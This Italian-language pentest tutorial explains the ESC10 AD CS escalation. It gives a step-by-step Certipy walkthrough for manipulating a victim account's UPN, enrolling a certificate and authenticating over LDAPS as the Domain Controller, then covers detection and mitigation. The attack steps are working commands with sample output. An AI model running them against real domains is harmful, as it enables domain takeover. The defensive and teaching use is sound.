---
title: 'ESC10 ADCS: Privilege Escalation tramite Weak Certificate Mapping Schannel'
slug: esc10-adcs
description: ESC10 sfrutta weak certificate mapping in Schannel per impersonare account AD via LDAPS. Guida pratica con Certipy e UPN manipulation.
image: /10.webp
draft: true
date: 2026-03-09T00:00:00.000Z
categories:
  - windows
subcategories:
  - privilege-escalation
tags:
  - ad
  - adcs
  - esc
  - certipy
---

ESC10 è una tecnica di **Active Directory Privilege Escalation tramite AD CS** che sfrutta **weak certificate mapping in Schannel authentication**. Schannel è il componente Windows usato per TLS authentication su servizi come **LDAPS, IIS HTTPS e altri servizi TLS enterprise**.

A differenza di **Kerberos PKINIT**, il comportamento di Schannel non dipende dal parametro `StrongCertificateBindingEnforcement`, ma dalla configurazione del registro:

```text
HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\CertificateMappingMethods
```

Se questo valore include il flag **0x4 (UPN mapping)**, Schannel può mappare un certificato a un account Active Directory **solo usando l’UPN nel certificato**, ignorando il SID contenuto nella security extension.

Questo permette a un attaccante di impersonare altri account manipolando temporaneamente l’UPN di un account controllato.

***

# Identificazione ESC10

Certipy **non può rilevare ESC10 automaticamente**, perché richiede accesso al registro dei Domain Controller.

Bisogna controllare manualmente:

```text
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\CertificateMappingMethods
```

Valori vulnerabili includono il flag **0x4**.

Esempi:

```text
0x4
0xC
0x1C
0x1F
```

Configurazione sicura raccomandata:

```text
0x18
```

***

# Exploit ESC10 con Certipy

L'attacco sfrutta **UPN manipulation + certificate enrollment**.

Prerequisiti:

* permessi **GenericWrite** su un account
* template con **Client Authentication**
* DC con **UPN mapping attivo**

***

## Step 1 — Leggere UPN della vittima

```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```

Output:

```
userPrincipalName : victim@CORP.LOCAL
```

***

## Step 2 — Manipolare UPN

L'obiettivo è impersonare il **Domain Controller account**.

```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'dc$@corp.local' \
-user 'victim' update
```

Ora l’account victim ha UPN `dc$@corp.local`.

***

## Step 3 — Ottenere credenziali della vittima

Se necessario:

```bash
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```

Output:

```
Saving credential cache to victim.ccache
```

***

## Step 4 — Richiedere certificato

```bash
export KRB5CCNAME=victim.ccache
```

```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```

Output:

```
Got certificate with UPN 'dc$@corp.local'
Certificate object SID is 'S-1-5-21-...-1108'
Saving certificate to dc.pfx
```

Il certificato contiene:

* **UPN = dc$@corp.local**
* **SID = victim**

***

## Step 5 — Ripristinare UPN

```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```

***

## Step 6 — Autenticazione LDAPS

```bash
certipy auth -pfx 'dc.pfx' -dc-ip '10.0.0.100' -ldap-shell
```

Output:

```
Authenticated to '10.0.0.100' as: 'u:CORP\DC$'
```

Anche se il certificato contiene il **SID della vittima**, Schannel usa **UPN mapping** e autentica l'attaccante come **DC$**.

Ora l’attaccante ha accesso LDAP come Domain Controller.

***

# Possibili abusi post-exploitation

Una volta autenticato come DC:

* **Resource-Based Constrained Delegation**
* dump LDAP sensibili
* escalation verso **Domain Admin**

***

# Detection ESC10

Controllare:

* valore `CertificateMappingMethods`
* autenticazioni **LDAPS certificate-based**
* modifiche sospette agli **UPN**

Indicatori:

* certificati con UPN di account privilegiati
* autenticazioni TLS da host non previsti

***

# Mitigation ESC10

Configurazione sicura Schannel:

```text
CertificateMappingMethods = 0x18
```

Questo forza mapping basato su **Kerberos SID validation**.

***

Abilitare anche:

```text
StrongCertificateBindingEnforcement = 2
```

su tutti i Domain Controller.

***

# FAQ — ESC10 ADCS

### Cos'è ESC10?

Una vulnerabilità dovuta a **weak certificate mapping in Schannel authentication**.

### ESC10 riguarda Kerberos?

No. Riguarda **Schannel TLS authentication** (LDAPS, IIS).

### ESC10 richiede AD CS?

Sì. Serve un certificato client authentication.

### Qual è la differenza tra ESC9 e ESC10?

[ESC9](https://hackita.it/articoli/esc9-adcs) sfrutta certificati senza SID extension.
ESC10 sfrutta **UPN mapping in Schannel**.

***

**Key Takeaway:** se Schannel permette **UPN certificate mapping**, un attaccante può manipolare l’UPN di un account e autenticarsi come un Domain Controller via LDAPS.

***

> ESC10 è una tecnica avanzata di certificate abuse in Active Directory.
> Per vedere tutte le tecniche AD CS consulta la guida completa:
> [https://hackita.it/articoli/adcs-esc1-esc16](https://hackita.it/articoli/adcs-esc1-esc16)Continua con le escalation successive:
> [https://hackita.it/articoli/esc11-adcs](https://hackita.it/articoli/esc11-adcs) · [https://hackita.it/articoli/esc12-adcs](https://hackita.it/articoli/esc12-adcs)Supporta HackIta:
> [https://hackita.it/supporto](https://hackita.it/supporto)Vuoi imparare pentesting Active Directory o testare la sicurezza della tua infrastruttura?
> [https://hackita.it/servizi](https://hackita.it/servizi)Riferimenti tecnici:
> [https://specterops.io/blog/2021/06/17/certified-pre-owned/](https://specterops.io/blog/2021/06/17/certified-pre-owned/)
> [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)
> [https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/)
